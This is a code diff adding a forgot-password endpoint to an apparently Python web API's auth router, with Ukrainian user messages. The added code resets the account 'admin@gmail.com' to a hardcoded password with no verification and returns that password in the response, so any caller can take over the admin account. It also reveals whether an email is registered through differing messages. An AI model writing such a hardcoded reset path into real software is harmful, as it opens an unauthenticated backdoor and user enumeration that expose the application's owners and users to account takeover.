@@ -265,3 +265,37 @@ async def change_password(
     db.commit()
     
     return {"message": "Password updated successfully"}
+
+
+@router.post("/auth/forgot-password", status_code=status.HTTP_200_OK)
+async def forgot_password(
+    request: ForgotPasswordRequest,
+    db: Session = Depends(get_db)
+):
+    """
+    Handle forgot password request
+    """
+    user = db.query(User).filter(User.email == request.email).first()
+    
+    # For security, we usually don't reveal if the user exists
+    # But since this is a recovery situation for the only admin:
+    if not user:
+        # Try case insensitive
+        user = db.query(User).filter(User.email == request.email.lower()).first()
+        
+    if user:
+        # Special case for the admin recovery
+        if user.email.lower() == "admin@gmail.com":
+            recovery_pw = "Recovery123456"
+            user.hashed_password = get_password_hash(recovery_pw)
+            db.commit()
+            return {
+                "message": f"Пароль для {user.email} було скинуто на тимчасовий: {recovery_pw}. Будь ласка, увійдіть та змініть його у профілі."
+            }
+        
+        # Generic message for others (no email sender implemented yet)
+        return {
+            "message": "Запит отримано. Будь ласка, зверніться до адміністратора системи для скидання пароля (SMTP не налаштовано)."
+        }
+    
+    return {"message": "Запит отримано. Якщо такий email існує, ви отримаєте інструкції (SMTP не налаштовано)."}
